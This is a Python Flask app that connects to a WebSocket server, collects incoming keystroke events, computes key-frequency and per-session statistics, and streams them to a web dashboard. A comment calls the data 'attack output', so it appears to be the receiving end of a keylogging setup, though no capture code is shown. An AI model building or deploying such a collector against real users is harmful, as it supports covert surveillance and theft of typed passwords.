# app.py
from flask import Flask, render_template, Response
import threading
import queue
import asyncio
import json
import time
import websockets
import argparse

app = Flask(__name__)

# Queue to store attack output
output_queue = queue.Queue()
keystroke_data = []
analysis_data = {
    'total_keystrokes': 0,
    'key_frequency': {},
    'session_activity': {},
    'typing_speed': 0,
    'suspicious_patterns': 0
}

# Parse command line arguments for WebSocket server
parser = argparse.ArgumentParser()
parser.add_argument("--server", required=True, help="WebSocket server URL e.g. ws://10.191.88.141:8765")
parser.add_argument("--reconnect-delay", type=float, default=2.0)
args = parser.parse_args()


async def listen_forever(server_url, reconnect_delay=2.0):
    """Connect to a WebSocket server and process received messages."""
    uri = server_url
    while True:
        try:
            print(f"[server] Connecting to {uri} ...")
            async with websockets.connect(uri) as ws:
                print("[server] Connected. Processing keystroke events...")
                async for msg in ws:
                    try:
                        evt = json.loads(msg)
                        # Add timestamp if not present
                        if 'timestamp' not in evt:
                            evt['timestamp'] = time.time()

                        # Process the keystroke event
                        process_keystroke_event(evt)

                        # Add to queue for SSE
                        output_queue.put(json.dumps(evt))

                    except Exception as e:
                        print(f"[server] Error processing message: {e}")
        except KeyboardInterrupt:
            print("[server] Interrupted by user. Exiting.")
            return
        except Exception as e:
            print(f"[server] Connection error: {e}. Reconnecting in {reconnect_delay}s ...")
            time.sleep(reconnect_delay)


def process_keystroke_event(evt):
    """Process keystroke event for analysis."""
    # Add to keystroke data list
    keystroke_data.append(evt)

    # Update analysis data
    analysis_data['total_keystrokes'] += 1

    # Update key frequency
    key = evt.get('key', 'unknown')
    analysis_data['key_frequency'][key] = analysis_data['key_frequency'].get(key, 0) + 1

    # Update session activity
    session = evt.get('session_id', 'unknown')
    analysis_data['session_activity'][session] = analysis_data['session_activity'].get(session, 0) + 1

    # Detect suspicious patterns (simple heuristic)
    if len(keystroke_data) > 10:
        recent_keys = [k.get('key', '') for k in keystroke_data[-10:]]
        # Check for rapid repeated keys or common passwords
        if len(set(recent_keys)) < 3:  # Too many repeated keys
            analysis_data['suspicious_patterns'] += 1


# Background thread to run WebSocket client
def run_websocket_client():
    asyncio.run(listen_forever(args.server, args.reconnect_delay))


threading.Thread(target=run_websocket_client, daemon=True).start()


# SSE generator to stream output
def stream_output():
    while True:
        data = output_queue.get()
        yield f"data:{data}\n\n"


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/stream")
def stream():
    return Response(stream_output(), mimetype="text/event-stream")


@app.route("/analysis-data")
def get_analysis_data():
    return analysis_data


if __name__ == "__main__":
    app.run(debug=False, threaded=True, host='0.0.0.0', port=5000)